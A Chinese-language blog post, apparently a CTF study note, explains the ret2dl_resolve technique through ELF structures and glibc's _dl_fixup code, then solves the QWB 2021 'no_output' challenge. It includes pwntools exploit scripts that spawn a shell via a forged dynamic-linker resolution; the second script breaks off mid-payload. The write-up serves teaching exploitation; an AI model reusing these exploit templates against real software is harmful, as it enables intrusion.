<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>ret2dl_resolve | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>ret2dl_resolve</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-12-05T20:33:08.000Z" id="date"> 2023-12-05</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-12-06T12:14:23.826Z" id="updated"> 2023-12-06</time></div></span></div></div><hr><div id="post-content"><p><em>适用于无法leak信息的栈溢出</em><br>动态装载器负贵将二进制文件及依赖库加载到内存，该过程包含了对导入符号（函数和全局变量）的解析。<br>每个符号都是一个Elf_Sym结构体的实例，这些符号又共同组成<br>了.dynsym段。Elf_Sym结构体如下所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*Symbol table entry.*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    Elf32_Word      st name;<span class="hljs-comment">/*Symbol name (string tbl index)*/</span><br>    Elf32_Addr      st_value;<span class="hljs-comment">/*Symbol value*/</span><br>    Elf32_Word      st_size;<span class="hljs-comment">/*Symbol size*/</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   st info;<span class="hljs-comment">/*Symbol type and binding */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>   st_other;<span class="hljs-comment">/*Symbol visibility*/</span><br>    Elf32_Section   st shndx;<span class="hljs-comment">/*Section index*/</span><br>&#125;Elf32_Sym;<br><span class="hljs-comment">/*How to extract and insert information held in the st info field.*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_BIND(val)      (((unsigned char)(val))&gt;&gt;4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_TYPE(val)      ((va1)&amp;0xf)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_ST_INFO(bind,type)((bind) &lt;&lt; 4)+((type) &amp;0xf)</span><br></code></pre></td></tr></table></figure>
<p>其中st_name域是相对于.dynstr段的偏移，保存符号名字符串；st_value域是当符号被导出时用于存放虚拟地址的，不导出时则为NULL。</p>
<p>导入符号的解析需要进行重定位，每个重定位项都是一个ELF_Rel结构体的实例<br>这些项又共同组成了.rl.plt段（用于导入函数）和.rel.dyn段（用于导入全局变量）。Elf_Rel结构体如下所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*Relocation table entry without addend (in section of type SHT_REL).*/</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    Elf32_Addr r_offset;<span class="hljs-comment">/*Address*/</span><br>    Elf32_Word r_info;<span class="hljs-comment">/*Relocation type and symbol index*/</span><br>&#125; Elf32_Rel;<br><span class="hljs-comment">/*How to extract and insert information held in the r info field.*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_SYM(val)        ((val)&gt;&gt;8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_TYPE(val)       ((val)&amp; Oxff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_INFO(sym,type)  (((sym)&lt;&lt;8)((type)&amp;0xff))</span><br></code></pre></td></tr></table></figure>
<p>其中r_offset.域用于保存解析后的符号地址写入内存的位置（绝对地址），rinfo域的高位3个字节用于标识该符号在.dynsym段中的位<br>置（无符号下标）。</p>
<p>因此，当程序导入一个函数时，动态链接器会同时在.dynstr段中添加一个函数名字符串，在.dynsym段中添加一个指向函数名字符串的EIf_Sym,在.rel.plt段中添加一个指向EIf_Sym的Elf_Rel。<br>最后，这些Elf_Rel的r_offset域又构成了GOT表，保存在.got.plt段中。<br>由于引入了延迟绑定机制，符号的解析只有在第一次使用的时候才进行，该过程是通过PLT表进行的。每个导入函数都在PLT表中有一个条目，<br>其第1条指令无条件跳转到对应G0T条目保存的地址处。<br>而每个GOT条目在初始化时都默认指向对应PLT条目的第2条指令的位置，相当于又跳回来了。<br>此时继续执行PLT的后两条指令，先将导入函数的标识(Elf_Rel在.rel.plt段中的偏移)压栈，然后跳转到PLT0执行。<br>PLT0包含两条指令，先将GOT[1]的值（一个link_map对象的地址）压栈，然后跳转到GOT[2]保存到地址处<br>也就是_dl_runtime_resolve()函数。<br>函数参数link_map_obj用于获取解析导入函数所需的信息，参数reloc_.indox则标识了解析哪一个导入函数。<br>解析完成后，相应的GOT条目会被修改为正确的函数地址，此后程序再调用该函数时就不需要再次进行解析了。</p>
<p>在i386下，_dl_runtime_resolve()由汇编实现，如下<br class='item-img' data-src='/2023/12/06/ret2dl-resolve/dl-resolve.png'><img src="/2023/12/06/ret2dl-resolve/dl-resolve.png"><br></p>
<p>其中，_dl_fixup()函数在&#x2F;elf&#x2F;dl-runtime.c中实现，用于解析导入函数的真实地址，并改写GOT,如下<br><em>注意，这里是glibc2.31的实现</em></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c">DL_FIXUP_VALUE_TYPE<br>attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE<br>_dl_fixup (<br><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><br>	   ELF_MACHINE_RUNTIME_FIXUP_ARGS,<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>	   <span class="hljs-keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)<br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *<span class="hljs-type">const</span> symtab<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *strtab = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);<br><br>  <span class="hljs-type">const</span> PLTREL *<span class="hljs-type">const</span> reloc<br>    = (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];<br>  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Sym)</span> *refsym = sym;<br>  <span class="hljs-type">void</span> *<span class="hljs-type">const</span> rel_addr = (<span class="hljs-type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);<span class="hljs-comment">//对应got表地址</span><br>  <span class="hljs-type">lookup_t</span> result;<br>  DL_FIXUP_VALUE_TYPE value;<br><br>  <span class="hljs-comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span><br>  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);<span class="hljs-comment">//检查</span><br><br>   <span class="hljs-comment">/* Look up the target symbol.  If the normal lookup rules are not</span><br><span class="hljs-comment">      used don&#x27;t look in the global scope.  */</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">r_found_version</span> *<span class="hljs-title">version</span> =</span> <span class="hljs-literal">NULL</span>;<br><br>      <span class="hljs-keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="hljs-literal">NULL</span>)<br>	&#123;<br>	  <span class="hljs-type">const</span> <span class="hljs-title function_">ElfW</span><span class="hljs-params">(Half)</span> *vernum =<br>	    (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);<br>	  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="hljs-number">0x7fff</span>;<br>	  version = &amp;l-&gt;l_versions[ndx];<br>	  <span class="hljs-keyword">if</span> (version-&gt;hash == <span class="hljs-number">0</span>)<br>	    version = <span class="hljs-literal">NULL</span>;<br>	&#125;<br><br>      <span class="hljs-comment">/* We need to keep the scope around so do some locking.  This is</span><br><span class="hljs-comment">	 not necessary for objects which cannot be unloaded or when</span><br><span class="hljs-comment">	 we are not using any threads (yet).  */</span><br>      <span class="hljs-type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;<br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	&#123;<br>	  THREAD_GSCOPE_SET_FLAG ();<br>	  flags |= DL_LOOKUP_GSCOPE_LOCK;<br>	&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span><br>      RTLD_ENABLE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,<br>				    version, ELF_RTYPE_CLASS_PLT, flags, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//找到对应libc，返回指向libc_base的指针</span><br><br>      <span class="hljs-comment">/* We are done with the global scope.  */</span><br>      <span class="hljs-keyword">if</span> (!RTLD_SINGLE_THREAD_P)<br>	THREAD_GSCOPE_RESET_FLAG ();<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span><br>      RTLD_FINALIZE_FOREIGN_CALL;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>      <span class="hljs-comment">/* Currently result contains the base load address (or link map)</span><br><span class="hljs-comment">	 of the object that defines sym.  Now add in the symbol</span><br><span class="hljs-comment">	 offset.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (result,<br>				   SYMBOL_ADDRESS (result, sym, <span class="hljs-literal">false</span>));<span class="hljs-comment">//获得函数真实地址</span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* We already found the symbol.  The module (and therefore its load</span><br><span class="hljs-comment">	 address) is also known.  */</span><br>      value = DL_FIXUP_MAKE_VALUE (l, SYMBOL_ADDRESS (l, sym, <span class="hljs-literal">true</span>));<br>      result = l;<br>    &#125;<br><br>  <span class="hljs-comment">/* And now perhaps the relocation addend.  */</span><br>  value = elf_machine_plt_value (l, reloc, value);<br><br>  <span class="hljs-keyword">if</span> (sym != <span class="hljs-literal">NULL</span><br>      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="hljs-number">0</span>))<br>    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));<br><br>  <span class="hljs-comment">/* Finally, fix up the plt itself.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))<br>    <span class="hljs-keyword">return</span> value;<br><br>  <span class="hljs-keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); <span class="hljs-comment">//写入got表</span><br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>此外，由于RELRO保护机制会影响延迟绑定，因此也会影响ret2dl-resolve:<br><strong>Partial RELRO:包括.dynamic段在内的一些段会被标识为只读。</strong><br><strong>Full RELRO:在Partial RELRO的基础上，禁用延迟绑定，即所有的导入符号在加载时就被解析，.got.pt段被完全初始化为目标函数的地址，并标记为只读。</strong></p>
<p>(1)关闭RELRO保护，使.dynamic段可写时：由于动态装载<br>器是从.dynamic.段的DT_STRTAB条目中来获取.dynstr段的地址，<br>而DT_STRTAB的位置是己知的，且默认情况下可写，所以攻击者能<br>够改写DT_STRTAB的内容，欺骗动态装载器，使它以为.dynstr.段<br>在.bSs上，同时在那里伪造一个假的字符串表。当动态装载器尝试解<br>析printf()时就会使用不同的基地址来寻找函数名，最终执行的是<br>execve().<br>(2)开启Partial RELRO保护，使.dynamic段不可写时：我们<br>知道_dl_runtime_resolve()的第二个参数reloc_.index对应Elf_Rel<br>在.rel.plt段中的偏移，动态装载器将其加上.rel.plt的基地址来得到<br>目标Elf Rel的内存地址。然而，当这个内存地址超出了.rel.plt段，<br>并最终落在.bss段中时，攻击者就可以在那里伪造一个Elf_Rel,使<br>r_offset的值是一个可写的内存地址来将解析后的函数地址写在那<br>里。同理，使rifo的值是一个能够将动态装载器导向到攻击者控制<br>内存的下标，指向一个位于它后面的Elf_Sym,而Elf_Sym中的<br>st_name指向它后面的函数名字符串。</p>
<p>直接在题上复现过程<br>[强网杯2021 no_output]<br>checksec<br class='item-img' data-src='/2023/12/06/ret2dl-resolve/checksec.png'><img src="/2023/12/06/ret2dl-resolve/checksec.png"><br><br>在程序运行前（执行第一次read前）<br class='item-img' data-src='/2023/12/06/ret2dl-resolve/start.png'><img src="/2023/12/06/ret2dl-resolve/start.png"><br> 断点下到的位置就是read@plt,顺带可以看到dl_runtime_resolve的入口<br class='item-img' data-src='/2023/12/06/ret2dl-resolve/entry.png'><img src="/2023/12/06/ret2dl-resolve/entry.png"><br><br class='item-img' data-src='/2023/12/06/ret2dl-resolve/got.png'><img src="/2023/12/06/ret2dl-resolve/got.png"><br>接下来走逆向部分<br class='item-img' data-src='/2023/12/06/ret2dl-resolve/init.png'><img src="/2023/12/06/ret2dl-resolve/init.png"><br>这里打开了flag，同时将unk_804C080存在全局变量result。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>v3 = <span class="hljs-string">&quot;tell me some thing&quot;</span>;<br>read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>u);<br>v3 = <span class="hljs-string">&quot;Tell me your name:\n&quot;</span>;<br>read(<span class="hljs-number">0</span>, src, <span class="hljs-number">0x20</span>u);  <br>sub_80493EC(src);  <br><span class="hljs-built_in">strcpy</span>(dest, src);  <span class="hljs-comment">// strcpy 被 &#x27;\x00&#x27; 截断，而且还会往 dest 后面补一个 &#x27;\x00&#x27;</span><br>v3 = <span class="hljs-string">&quot;now give you the flag\n&quot;</span>;<br>read(unk_804C080, src, <span class="hljs-number">0x10</span>u);<br><span class="hljs-comment">// off_804C034 存放的是字符串 &quot;hello_boy\x00&quot;</span><br><span class="hljs-comment">// check() 是字符串比较，两个字符串相同返回 0</span><br>result = check(src, off_804C034); <br><span class="hljs-keyword">if</span> ( !result )<br>  result = sub_8049269();<br></code></pre></td></tr></table></figure>
<p>这里的strcpy存在一个类似于off-by-null的漏洞，会把fd覆盖为\x00,因为dest后面就是fd，如下：<br class='item-img' data-src='/2023/12/06/ret2dl-resolve/off-by-null.png'><img src="/2023/12/06/ret2dl-resolve/off-by-null.png"><br>导致后一个read实际执行read(unk_804C080,src,0x10),因此可以通过直接输入”hello_boy\x00”来进入sub_8049269，如下<br class='item-img' data-src='/2023/12/06/ret2dl-resolve/vuln.png'><img src="/2023/12/06/ret2dl-resolve/vuln.png"><br>此处 signal() 函数的作用在于：当发生除法异常时，执行 sub_8049236 函数，sub_8049236 函数中便是一个栈溢出了。<br class='item-img' data-src='/2023/12/06/ret2dl-resolve/vuln1.png'><img src="/2023/12/06/ret2dl-resolve/vuln1.png">由于 v1 不能为 0，我们令 v2 &#x3D; -2147483648, v1 &#x3D; -1，此时会发生除法溢出（int 类型的数据范围为：-2147483648 ~ 2147483647）。由于没有输出函数，用 ret2dlresolve 的方式来利用这个栈溢出漏洞。<br>存两个模板吧<br>ezdl</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./no_output&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./no_output&#x27;</span>)<br>rop = ROP(<span class="hljs-string">&#x27;./no_output&#x27;</span>)<br><br><span class="hljs-comment"># 这里很奇怪，好像放别的字符串都不行...</span><br>p.send(<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>p.send(<span class="hljs-string">b&#x27;hello_boy\x00&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;-2147483648&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br><br><br>dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="hljs-string">&quot;system&quot;</span>, args=[<span class="hljs-string">&quot;/bin/sh&quot;</span>])<br><span class="hljs-built_in">print</span>(dlresolve)<br><br>rop.read(<span class="hljs-number">0</span>, dlresolve.data_addr)<br>rop.ret2dlresolve(dlresolve)<br>raw_rop = rop.chain()<br>info(rop.dump())<br><span class="hljs-comment"># fit() 函数会自动填充，76 是溢出点，0x100 是 read() 函数的长度</span><br>p.sendline(fit(&#123;<span class="hljs-number">76</span>:raw_rop, <span class="hljs-number">0x100</span>:dlresolve.payload&#125;))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
<p>detail</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> p32<br><br>challenge = <span class="hljs-string">&quot;./no_output&quot;</span><br>context(arch = <span class="hljs-string">&quot;i386&quot;</span>,log_level = <span class="hljs-string">&quot;debug&quot;</span>,os = <span class="hljs-string">&quot;linux&quot;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./no_output&#x27;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#r = remote(&quot;39.105.138.97&quot;,1234)</span><br>elf = ELF(<span class="hljs-string">&#x27;./no_output&#x27;</span>)<br><br>leave_ret = <span class="hljs-number">0x080491a5</span><br>bss_stage = elf.bss() + <span class="hljs-number">0x200</span><br>success(<span class="hljs-string">&quot;bss : %s&quot;</span>,<span class="hljs-built_in">hex</span>(elf.bss()))<br>fake_ebp = bss_stage<br>offset = <span class="hljs-number">0x4c</span>-<span class="hljs-number">8</span>+<span class="hljs-number">8</span><br><span class="hljs-comment">#read_plt  = elf.plt[&quot;read&quot;]</span><br><br><span class="hljs-comment">#gdb.attach(r)</span><br>p1 = <span class="hljs-string">b&quot;\x00&quot;</span> * <span class="hljs-number">0x30</span><br>p.send(p1)<br>sleep(<span class="hljs-number">1</span>)<br>p.send(<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x20</span>)<br>str1 = <span class="hljs-string">b&#x27;hello_boy&#x27;</span><br>str1 = str1.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>p.send(str1)<br>p.sendline(<span class="hljs-string">b&quot;-2147483648&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;-1&quot;</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br><br>read_plt = <span class="hljs-number">0x80490C4</span><br>ppp_ret = <span class="hljs-number">0x08049581</span> <span class="hljs-comment"># ROPgadget --binary test --only &quot;pop|ret&quot;</span><br>pop_ebp_ret = <span class="hljs-number">0x08049583</span><br>leave_ret = <span class="hljs-number">0x080491a5</span> <span class="hljs-comment"># ROPgadget --binary test --only &quot;leave|ret&quot;</span><br><br>stack_size = <span class="hljs-number">0x800</span><br>bss_addr = elf.bss() <span class="hljs-comment"># readelf -S test | grep &quot;.bss&quot;</span><br>base_stage = bss_addr + stack_size<br><br><br>payload = flat(<span class="hljs-string">b&#x27;A&#x27;</span> * offset<br>, p32(read_plt)<br>, p32(ppp_ret)<br>, p32(<span class="hljs-number">0</span>)<br>, p32(base_stage)<br>, p32(<span class="hljs-number">100</span>)<br>, p32(pop_ebp_ret)<br>, p32(base_stage)<br>, p32(leave_ret))<br>p.send(payload)<br><br>cmd = <span class="hljs-string">&quot;/bin/sh&quot;</span><br>plt_0 = <span class="hljs-number">0x8049030</span> <span class="hljs-comment"># objdump -d -j .plt test</span><br>rel_plt = <span class="hljs-number">0x8048414</span> <span class="hljs-comment"># objdump -s -j .rel.plt test</span><br>dynsym = <span class="hljs-number">0x08048248</span>  <span class="hljs-comment"># readelf -S test</span><br>strtab = <span class="hljs-number">0x08048318</span> <span class="hljs-comment">#readelf -S test</span><br>fake_write_addr = base_stage + <span class="hljs-number">28</span><br>fake_arg = fake_write_addr - rel_plt<br>r_offset = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>align = <span class="hljs-number">0x10</span> - ((base_stage + <span class="hljs-number">36</span> - dynsym) % <span class="hljs-number">16</span>) <br>fake_sym_addr = base_stage + <span class="hljs-number">36</span> + align <span class="hljs-comment"># 填充地址使其与dynsym的偏移16字节对齐（即两者的差值能被16整除），因为结构体sym的大小都是16字节</span><br>r_info = ((((fake_sym_addr - dynsym)//<span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">8</span>) | <span class="hljs-number">0x7</span>) <span class="hljs-comment"># 使其最低位为7，通过检测</span><br>fake_write_rel = flat(p32(r_offset), p32(r_info))<br>fake_write_str_addr = base_stage + <span class="hljs-number">36</span> + align + <span class="hljs-number">0x10</span><br>fake_name = fake_write_str_addr - strtab<br>fake_sym = flat(p32(fake_name),p32(<span class="hljs-number">0</span>),p32(<span class="hljs-number">0</span>),p32(<span class="hljs-number">0x12</span>))<br>fake_write_str = <span class="hljs-string">&#x27;system\x00&#x27;</span><br><br>payload2 = flat(<span class="hljs-string">b&#x27;AAAA&#x27;</span><br>, p32(plt_0)<br>, fake_arg<br>, p32(ppp_ret)<br>, p32(base_stage + <span class="hljs-number">80</span>)<br>, p32(base_stage + <span class="hljs-number">80</span>)<br>, 